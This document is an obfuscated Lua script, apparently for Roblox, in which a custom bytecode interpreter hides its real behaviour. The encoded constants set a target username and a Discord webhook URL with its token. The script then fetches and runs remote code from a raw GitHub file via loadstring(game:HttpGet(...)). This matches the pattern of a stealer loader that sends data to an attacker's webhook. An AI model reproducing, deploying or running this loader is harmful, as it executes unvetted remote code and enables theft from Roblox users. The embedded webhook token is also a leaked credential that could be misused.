do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v31)if (v1(v31,2)==79) then local v70=0;while true do if (v70==0) then v20=v0(v3(v31,1,1));return "";end end else local v71=v2(v0(v31,16));if v20 then local v77=v5(v71,v20);v20=nil;return v77;else return v71;end end end);v21=nil;v18=1;end if (v18==2) then v23=function()local v39=(256 + 268) -(219 + 305) ;local v40;local v41;while true do if (v39==(912 -(63 + 74 + 775))) then v40,v41=v1(v16,v19,v19 + 2 );v19=v19 + (2 -0) ;v39=4 -3 ;end if (v39==1) then return (v41 * (636 -380)) + v40 ;end end end;v24=nil;v24=function()local v42,v43,v44,v45=v1(v16,v19,v19 + 3 + 0 );v19=v19 + (1569 -(171 + 1394)) ;return (v45 * (12378043 + 4399173)) + (v44 * 65536) + (v43 * ((1715 -(427 + 277)) -755)) + v42 ;end;v25=nil;v18=3;end if (v18==4) then v28=nil;v28=function(...)return {...},v12("#",...);end;v29=nil;v29=function()local v46=815 -(49 + 766) ;local v47;local v48;local v49;local v50;local v51;local v52;while true do local v66=144 -(109 + 35) ;local v67;while true do if (v66~=(0 -0)) then else v67=0 -0 ;while true do if (v67==(0 -0)) then local v99=1948 -(1435 + 513) ;while true do if (v99==0) then if (v46~=(0 -0)) then else v47={};v48={};v49={};v46=2 -1 ;end if ((6 -3)==v46) then local v105=0 -0 ;while true do if (v105~=0) then else for v118=1,v24() do v48[v118-1 ]=v29();end for v120=1,v24() do v49[v120]=v24();end v105=1 + 0 ;end if (v105~=1) then else return v50;end end end v99=3 -2 ;end if (v99==(1 + 0)) then v67=1542 -(1465 + 76) ;break;end end end if (v67==(290 -(101 + 188))) then if (v46~=2) then else local v104=429 -(344 + 85) ;while true do if (v104~=(1518 -(701 + 817))) then else for v107=2 -1 ,v51 do local v108=0;local v109;local v110;local v111;while true do if (v108==(0 -0)) then v109=773 -(192 + 581) ;v110=nil;v108=1 -0 ;end if (1~=v108) then else v111=nil;while true do if (v109==(1 -0)) then if (v110==(2 -1)) then v111=v22()~=0 ;elseif (v110==(2000 -(1511 + 487))) then v111=v25();elseif (v110==(1 + 2)) then v111=v26();end v52[v107]=v111;break;end if (v109==0) then local v123=0;while true do if (v123~=(0 + 0)) then else v110=v22();v111=nil;v123=1;end if (v123~=(1 + 0)) then else v109=2 -1 ;break;end end end end break;end end end v50[6 -3 ]=v22();v104=2 -1 ;end if (v104~=(2 -1)) then else for v112=1,v24() do local v113=0 -0 ;local v114;local v115;while true do if (v113==(1 + 0)) then while true do if (v114==(1157 -(667 + 490))) then v115=v22();if (v21(v115,1 + 0 ,2 -1 )==(0 + 0)) then local v124=0 -0 ;local v125;local v126;local v127;local v128;while true do if (v124~=(1 + 0)) then else v127=nil;v128=nil;v124=2;end if (v124==(0 -0)) then v125=0 -0 ;v126=nil;v124=1;end if (v124~=(7 -5)) then else while true do if (v125==3) then if (v21(v127,1 + 2 ,3)==(1169 -(727 + 441))) then v128[4 + 0 ]=v52[v128[4]];end v47[v112]=v128;break;end if (v125==(1045 -(248 + 797))) then local v156=704 -(140 + 564) ;while true do if ((1184 -(460 + 723))==v156) then v125=2 -1 ;break;end if ((0 + 0)~=v156) then else v126=v21(v115,2,3);v127=v21(v115,4,17 -11 );v156=1;end end end if (v125~=(1 + 0)) then else local v157=0 + 0 ;local v158;while true do if (v157==(331 -(53 + 278))) then v158=0 + 0 ;while true do if (v158==(0 -0)) then v128={v23(),v23(),nil,nil};if (v126==(0 -0)) then local v177=0;local v178;local v179;while true do if (v177==(344 -(231 + 112))) then while true do if (v178~=(0 -0)) then else v179=0;while true do if (0==v179) then v128[1451 -(532 + 916) ]=v23();v128[4 + 0 ]=v23();break;end end break;end end break;end if (v177~=(0 -0)) then else v178=0;v179=nil;v177=750 -(349 + 400) ;end end elseif (v126==1) then v128[2 + 1 ]=v24();elseif (v126==(2 + 0)) then v128[14 -11 ]=v24() -((1 + 1)^(79 -63)) ;elseif (v126==(1181 -(930 + 248))) then local v186=0;local v187;local v188;while true do if (v186==1) then while true do if (v187==(1532 -(628 + 904))) then v188=0;while true do if (v188~=(273 -(223 + 50))) then else v128[746 -(710 + 33) ]=v24() -((5 -3)^16) ;v128[7 -3 ]=v23();break;end end break;end end break;end if (v186~=(0 + 0)) then else local v191=0 + 0 ;while true do if (v191~=(1755 -(12 + 1742))) then else v186=1;break;end if (v191==(0 + 0)) then v187=0 -0 ;v188=nil;v191=2 -1 ;end end end end end v158=338 -(67 + 270) ;end if (v158==(531 -(92 + 438))) then v125=2;break;end end break;end end end if ((193 -(137 + 54))==v125) then local v159=0;while true do if (v159==1) then v125=3;break;end if (v159~=(699 -(67 + 632))) then else local v167=0 + 0 ;local v168;while true do if ((563 -(520 + 43))==v167) then v168=0;while true do if (v168~=(0 + 0)) then else if (v21(v127,1,1 + 0 )~=(929 -(435 + 493))) then else v128[1 + 1 ]=v52[v128[1926 -(325 + 1599) ]];end if (v21(v127,2 + 0 ,2)==(2 -1)) then v128[1 + 2 ]=v52[v128[3]];end v168=2 -1 ;end if (v168==1) then v159=1;break;end end break;end end end end end end break;end end end break;end end break;end if (v113==(994 -(674 + 320))) then v114=0;v115=nil;v113=1 -0 ;end end end v46=1 + 2 ;break;end end end if (v46~=(1924 -(558 + 1365))) then else v50={v47,v48,nil,v49};v51=v24();v52={};v46=2 + 0 ;end break;end end break;end end end end;v18=5;end if (v18==5) then v30=nil;v30=function(v32,v33,v34)local v53=0;local v54;local v55;local v56;while true do if (v53==0) then v54=v32[1];v55=v32[2];v53=1;end if (1==v53) then v56=v32[3];return function(...)local v78=1;local v79= -1;local v80={...};local v81=v12("#",...) -1 ;local function v82()local v84=v54;local v85=v55;local v86=v56;local v87=v28;local v88={};local v89={};local v90={};for v94=0 + 0 ,v81 do if ((1668<=4927) and (v94>=v86)) then v88[v94-v86 ]=v80[v94 + 1 ];else v90[v94]=v80[v94 + (1048 -(1006 + 41)) ];end end local v91=(v81-v86) + (2 -(1 -0)) ;local v92;local v93;while true do local v95=(2237 -(1213 + 739)) -(98 + 187) ;local v96;local v97;while true do if (((1517 + 846)>(1381 + 377)) and ((0 + 0)==v95)) then v96=(1099 -(105 + 36)) -(329 + 629) ;v97=nil;v95=(1874 -(637 + 1236)) + 0 ;end if (((2159 + 56)<(1640 + 594)) and (v95==1)) then while true do if ((v96==(0 + 0)) or ((914 -344)>(4387 -(54 + 724)))) then v97=0 -0 ;while true do if (((1510 + 3160)>=(2483 -(1111 + 196))) and (v97==((0 -0) + 0))) then local v116=(0 + 0) -0 ;local v117;while true do if (((835 -(97 + 738))==v116) or ((41 + 21)>(4551 -(88 + 186)))) then v117=147 -(89 + 58) ;while true do if (((2932 -(748 + 1150))<=(4079 -(553 + 281))) and (v117==0)) then local v129=0 -0 ;while true do if ((v129==(906 -(392 + 513))) or ((549 + 5)==(1360 + 2293))) then v117=1 -0 ;break;end if ((v129==(877 -(287 + 590))) or (3667<(5728 -3768))) then v92=v84[v78];v93=v92[1];v129=1 + 0 ;end end end if ((v117==(1 -0)) or ((3706 -1863)==(14524 -10304))) then v97=1 + 0 + 0 ;break;end end break;end end end if (((4072 + 49)==((332 + 11830) -8041)) and (v97==(1792 -(653 + 1138)))) then if (((2288 -(1063 + 508))==717) and (v93<=(1204 -(646 + 554)))) then if ((v93<=(3 -2)) or ((4946 -2582)>=4726)) then if (((3247 + 694)==(1346 + 2595)) and (v93>(0 + 0))) then v34[v92[2 + 1 ]]=v90[v92[2 -0 ]];else local v132=1422 -(580 + 842) ;local v133;local v134;local v135;local v136;while true do if (((2781 -(3521 -1513))<(4707 -2838)) and (v132==(5 -3))) then while true do if ((1039<(14243 -9606)) and (v133==(1344 -(291 + 1052)))) then v136=nil;while true do if ((v134==(0 -0)) or ((6339 -(8023 -4548))==(3953 + 380))) then local v169=74 -(36 + 38) ;while true do if (((729 + 1681)>=(2152 -(342 + 307 + 893))) and (v169==(1 + 0))) then v134=1 + 0 + 0 ;break;end if ((v169==0) or (1712==(6907 -(363 + 2881)))) then v135=v92[4 -2 ];v136=v90[v92[1286 -(1014 + 269) ]];v169=(1014 + 165) -(747 + 431) ;end end end if (((3 -2)==v134) or (489>=(1641 -(62 + 286)))) then v90[v135 + 1 + 0 ]=v136;v90[v135]=v136[v92[3 + 1 ]];break;end end break;end if ((v133==0) or ((7759 -(5586 -(268 + 559)))>=(11512 -8134))) then local v160=0 -0 ;while true do if ((v160==(0 -0)) or ((5772 -3805)>(1882 + 3070))) then v134=0;v135=nil;v160=1 -0 ;end if (((13718 -10202)>=(4305 -(146 + 165 + 1254))) and (v160==(1 + 0))) then v133=1211 -(993 + 217) ;break;end end end end break;end if ((v132==(0 -0)) or ((3073 -(484 + 889))>(282 + 4677))) then v133=(0 -0) + 0 ;v134=nil;v132=1 + 0 + 0 ;end if (((4 -3)==v132) or (2951>(990 + 2453))) then v135=nil;v136=nil;v132=1497 -(115 + 576 + 804) ;end end end elseif ((v93<=(6 -4)) or (((1797 -(885 + 416)) + (3802 -1676))<=(548 -(56 + (1778 -(484 + 834)))))) then if ((v90[v92[2]]==v92[1985 -((2595 -(578 + 235)) + 199) ]) or ((5625 -(721 + 973))>4725)) then v78=v78 + (1 -0) ;else v78=v92[3];end elseif (((1773 + 74)<(5873 -2187)) and (v93==(551 -(300 + 248)))) then do return;end else v78=v92[11 -8 ];end elseif ((v93<=(14 -8)) or ((3919 -(438 + 650))==(1932 -1463))) then if ((v93==(10 -5)) or ((3915 -(122 + 356))<(3348 -2261))) then v90[v92[(8 -5) -1 ]]=v92[981 -(460 + 317 + 201) ];else local v139=0 -0 ;local v140;local v141;local v142;local v143;local v144;while true do if ((3736>=3040) and (v139==(966 -(149 + 816)))) then v142=nil;v143=nil;v139=2 + 0 ;end if (((620 + 197)<=((40924 -26944) -9154)) and (0==v139)) then v140=0;v141=nil;v139=1 + 0 ;end if ((v139==(5 -(574 -(350 + 221)))) or (1319>3887)) then v144=nil;while true do if ((v140==0) or ((719 + 3625)<692)) then v141=v92[2 -(1272 -(659 + 613)) ];v142,v143=v87(v90[v141](v13(v90,v141 + (2 -1) ,v92[8 -5 ])));v140=1568 -((5800 -4301) + (449 -(134 + 247))) ;end if (((278 + (6127 -(1251 + 704)))>=(2667 -(815 + 387))) and (2==v140)) then for v162=v141,v79 do local v163=1375 -(1369 + 6) ;local v164;while true do if (((122 -(40 + 51))<=(448 + 3215)) and ((0 + 0)==v163)) then v164=0;while true do if ((v164==(0 -0)) or (((2224 -(390 + 70)) -((1508 -812) + 140))<=91)) then v144=v144 + (1393 -(661 + 698 + 33)) ;v90[v162]=v142[v144];break;end end break;end end end break;end if (((4103 -((1020 -(482 + 75)) + 78))==(3025 + 537)) and (v140==(1 + 0 + 0))) then v79=(v143 + v141) -(712 -(234 + 237 + 240)) ;v144=0 + 0 ;v140=1 + 1 ;end end break;end end end elseif (((2022 -1188)<1222) and (v93<=7)) then v90[v92[143 -(98 + 43) ]]=v34[v92[2 + 1 ]];elseif (((3218 -2412)==(2291 -1485)) and (v93==8)) then local v149=0 + 0 ;local v150;while true do if ((v149==0) or (3909<=3630)) then v150=v92[1399 -(696 + 701) ];v90[v150]=v90[v150](v13(v90,v150 + 1 ,v79));break;end end else v90[v92[2]]();end v78=v78 + (1745 -(524 + 1220)) ;break;end end break;end end break;end end end end A,B=v28(v11(v82));if  not A[1] then local v98=v32[4][v78] or "?" ;error("Script error at ["   .. v98   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end end end;return v30(v29(),{},v17)(...);end if (1==v18) then v21=function(v35,v36,v37)if v37 then local v72=(v35/((1982 -(1346 + (1733 -(584 + 515))))^(v36-(1477 -(358 + 1118)))))%((4 -2)^(((v37-(1 + 0)) -(v36-(1 + 0))) + (2 -1))) ;return v72-(v72%((619 -(195 + 423)) -0)) ;else local v73=(1 + 1 + 0)^(v36-(1 + 0)) ;return (((v35%(v73 + v73))>=v73) and (2 -1)) or (0 -0) ;end end;v22=nil;v22=function()local v57=v1(v16,v19,v19);v19=v19 + 1 ;return v57;end;v23=nil;v18=2;end if (v18==3) then v25=function()local v58=v24();local v59=v24();local v60=1835 -(1168 + 666) ;local v61=(v21(v59,1,5 + 5 + 10 ) * ((2 + 0)^(51 -19))) + v58 ;local v62=v21(v59,42 -21 ,53 -22 );local v63=((v21(v59,(2099 -1033) -(835 + 199) )==1) and  -(791 -(597 + 193))) or (1 + 0) ;if (v62==(1682 -(795 + 887))) then if (v61==(0 -(0 + 0))) then return v63 * ((0 + 0) -0) ;else local v83=0 -0 ;while true do if (v83==(0 -0)) then v62=1 + 0 ;v60=151 -(80 + 71) ;break;end end end elseif (v62==(5659 -3612)) then return ((v61==(1417 -(907 + 510))) and (v63 * ((1 + 0)/(1812 -(1342 + 470))))) or (v63 * NaN) ;end return v8(v63,v62-(1948 -((2215 -1304) + 14)) ) * (v60 + (v61/((2 + 0)^(623 -(293 + 278))))) ;end;v26=nil;v26=function(v38)local v64;if  not v38 then v38=v24();if (v38==(580 -(390 + 190))) then return "";end end v64=v3(v16,v19,(v19 + v38) -1 );v19=v19 + v38 ;local v65={};for v68=1 -0 , #v64 do v65[v68]=v2(v1(v3(v64,v68,v68)));end return v6(v65);end;v27=v24;v18=4;end end end v15("LOL!0A3O00028O0003083O00557365724E616D6503073O0032314C653O7603073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130383432352O303O3832333538363835382F6858595554696D575457345631664A5A7649785236317874774F682O6E3267635243684463427A6A766B6F376244364A76485A384C45616E624A50586C31566672643641026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033C3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6B34662O742F72692O7A6875622F6D61696E2F4E65772E6C756100143O0012053O00013O0026023O000800010001002O043O00080001001205000100033O001201000100023O001205000100053O001201000100043O0012053O00063O0026023O000100010006002O043O00010001001207000100073O001207000200083O00202O0002000200090012050004000A4O0006000200044O000800013O00022O0009000100010001002O043O00130001002O043O000100012O00033O00017O00143O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000C3O000E3O00",v9(),...);end
